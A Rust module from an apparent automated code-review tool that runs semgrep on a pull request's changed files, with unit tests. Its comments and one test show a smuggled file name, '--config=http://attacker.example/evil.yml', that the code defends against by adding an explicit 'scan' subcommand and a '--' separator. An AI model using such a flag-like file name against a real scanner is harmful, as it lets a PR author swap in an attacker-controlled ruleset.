use crate::procutil::{spawn_and_wait, which};
use std::time::Duration;

/// #169: a generous default for callers (like the CLI's automatic semgrep detection) that don't
/// have a more specific deadline of their own to bound this by.
pub const DEFAULT_TIMEOUT: Duration = Duration::from_secs(120);

/// If semgrep is on PATH, run it against the changed files and convert the output into
/// deterministic_results form. Returns None if it's missing or execution/parsing fails — the
/// caller falls back to the existing NOT_RUN path (never fabricates a guessed result).
/// dependency_sca/dataflow_taint/api_deprecation are left untouched (stay NOT_RUN) since the
/// default `--config=auto` ruleset alone can't cover them.
/// `changed_files` is a value fully controlled by the author of the PR under review — if a file
/// path starts with `-` (e.g. an actual file named `--config=http://attacker.example/evil.yml`)
/// and is passed through without a `--` separator, semgrep's own argument parser can mistake it
/// for a flag, letting an attacker override the scan config (ruleset source, etc.). `--` pins
/// everything after it as positional arguments.
///
/// Verified against the actual semgrep 1.172.0 binary: if the `scan` subcommand isn't specified
/// explicitly (relying on semgrep's "treat missing subcommand as scan" convenience feature) and
/// only `--` is added, `--` gets silently ignored and a filename starting with `--config=` still
/// gets parsed as a flag (apparently because Click's top-level group doesn't correctly forward
/// `--` when delegating to the default command) — `semgrep --config=auto --json --quiet --
/// <malicious-filename>` gets through unblocked. Specifying `scan` explicitly
/// (`semgrep scan --config=auto ... -- <file>`) makes everything after `--` get treated exactly
/// as positional arguments. The previous fix (just adding `--`) was ineffective on this
/// missing-subcommand path.
fn build_args<'a>(existing: &[&'a str]) -> Vec<&'a str> {
    let mut args = vec!["scan", "--config=auto", "--json", "--quiet", "--"];
    args.extend_from_slice(existing);
    args
}

/// #169: this used to be a synchronous `.output()` call with no timeout at all — a hang (e.g. a
/// slow first-run rule pull under `--config=auto`) blocked the whole review indefinitely,
/// regardless of `--deadline-minutes`, even though nothing in the LLM context actually depends
/// on this result (only `quantify::deterministic_gate`, at the very end of the pipeline, reads
/// it) — the caller is expected to run this in the background and only join it there. On
/// timeout, same as every other failure path here: falls back to NOT_RUN rather than fabricating
/// a guessed result.
pub fn try_run(changed_files: &[String], timeout: Duration) -> Option<serde_json::Value> {
    let bin = which("semgrep")?;
    let existing: Vec<&str> = changed_files
        .iter()
        .map(|s| s.as_str())
        .filter(|f| std::path::Path::new(f).exists())
        .collect();
    if existing.is_empty() {
        return None;
    }

    let output = spawn_and_wait(&bin, &build_args(&existing), timeout)?;
    let v: serde_json::Value = serde_json::from_slice(&output.stdout).ok()?;
    build_deterministic_results(output.status.success(), output.status.code(), &v)
}

/// #144: split out of `try_run` so the exit-status/errors-array handling can be unit tested
/// without shelling out to a real `semgrep` binary.
fn build_deterministic_results(
    exit_success: bool,
    exit_code: Option<i32>,
    v: &serde_json::Value,
) -> Option<serde_json::Value> {
    let results = v.get("results")?.as_array()?;

    // Neither the process exit status nor semgrep's own "errors" array (per-rule/per-file
    // failures during a partial scan) used to be checked — a nonzero exit that still produced
    // valid-but-incomplete JSON (an empty `results` from the rules that DID finish) looked
    // identical to a genuinely clean, fully-completed run. Report a distinct "error" status
    // instead of falling through to "pass" on an empty `results` array in that case.
    let semgrep_errors = v
        .get("errors")
        .and_then(|e| e.as_array())
        .filter(|a| !a.is_empty());
    if !exit_success || semgrep_errors.is_some() {
        let evidence = format!(
            "semgrep --config=auto exited with status {exit_code:?} and {} error(s) in its output — scan may be incomplete, not treated as pass/fail",
            semgrep_errors.map(|a| a.len()).unwrap_or(0)
        );
        return Some(serde_json::json!({
            "sast": { "status": "error", "evidence": evidence.clone() },
            "secrets": { "status": "error", "evidence": evidence },
        }));
    }

    let has_findings = !results.is_empty();
    let secrets_hit = results.iter().any(|r| {
        r.get("check_id")
            .and_then(|c| c.as_str())
            .map(|c| c.contains("secret") || c.contains("hardcoded"))
            .unwrap_or(false)
    });

    Some(serde_json::json!({
        "sast": {
            "status": if has_findings { "fail" } else { "pass" },
            "evidence": format!("semgrep --config=auto ran automatically: {} findings", results.len()),
        },
        "secrets": {
            "status": if secrets_hit { "fail" } else { "pass" },
            "evidence": "based on semgrep --config=auto results — not a dedicated secrets scanner, for reference only",
        },
    }))
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- build_deterministic_results() ---

    #[test]
    fn build_deterministic_results_reports_pass_on_a_clean_successful_run() {
        let v = serde_json::json!({"results": []});
        let out = build_deterministic_results(true, Some(0), &v).unwrap();
        assert_eq!(out["sast"]["status"], "pass");
        assert_eq!(out["secrets"]["status"], "pass");
    }

    #[test]
    fn build_deterministic_results_reports_fail_when_results_are_present() {
        let v = serde_json::json!({"results": [{"check_id": "some-rule"}]});
        let out = build_deterministic_results(true, Some(0), &v).unwrap();
        assert_eq!(out["sast"]["status"], "fail");
    }

    #[test]
    fn build_deterministic_results_reports_error_not_pass_on_a_nonzero_exit_with_empty_results() {
        // #144: this is the dangerous case — a partial/failed scan that still emitted valid
        // JSON with an empty `results` array must not look identical to a genuinely clean run.
        let v = serde_json::json!({"results": []});
        let out = build_deterministic_results(false, Some(2), &v).unwrap();
        assert_eq!(out["sast"]["status"], "error");
        assert_eq!(out["secrets"]["status"], "error");
        assert_ne!(out["sast"]["status"], "pass");
    }

    #[test]
    fn build_deterministic_results_reports_error_when_the_errors_array_is_non_empty_even_on_a_zero_exit(
    ) {
        let v = serde_json::json!({"results": [], "errors": [{"message": "rule timed out"}]});
        let out = build_deterministic_results(true, Some(0), &v).unwrap();
        assert_eq!(out["sast"]["status"], "error");
    }

    #[test]
    fn build_deterministic_results_ignores_an_empty_errors_array() {
        let v = serde_json::json!({"results": [], "errors": []});
        let out = build_deterministic_results(true, Some(0), &v).unwrap();
        assert_eq!(out["sast"]["status"], "pass");
    }
}

#[cfg(test)]
mod build_args_tests {
    use super::*;

    #[test]
    fn build_args_starts_with_explicit_scan_subcommand() {
        // Verified against the actual semgrep binary: relying on subcommand omission (implicit
        // scan) causes -- to be silently ignored — scan must be explicit for -- to actually work.
        let args = build_args(&["src/main.rs"]);
        assert_eq!(args[0], "scan");
    }

    #[test]
    fn build_args_places_separator_before_file_list() {
        let existing = vec!["src/main.rs", "src/lib.rs"];
        let args = build_args(&existing);
        let sep = args
            .iter()
            .position(|a| *a == "--")
            .expect("-- separator missing");
        assert!(
            args[1..sep].iter().all(|a| a.starts_with('-')),
            "everything between scan and -- must be actual flags"
        );
        assert_eq!(&args[sep + 1..], existing.as_slice());
    }

    #[test]
    fn build_args_keeps_flag_like_filename_as_positional() {
        // Case where an actual filename created by the PR looks like a flag — if it's after --,
        // semgrep must interpret it only as a positional argument (prevents config hijacking via parser confusion).
        let existing = vec!["--config=http://attacker.example/evil.yml"];
        let args = build_args(&existing);
        let sep = args.iter().position(|a| *a == "--").unwrap();
        assert_eq!(&args[sep + 1..], existing.as_slice());
    }
}
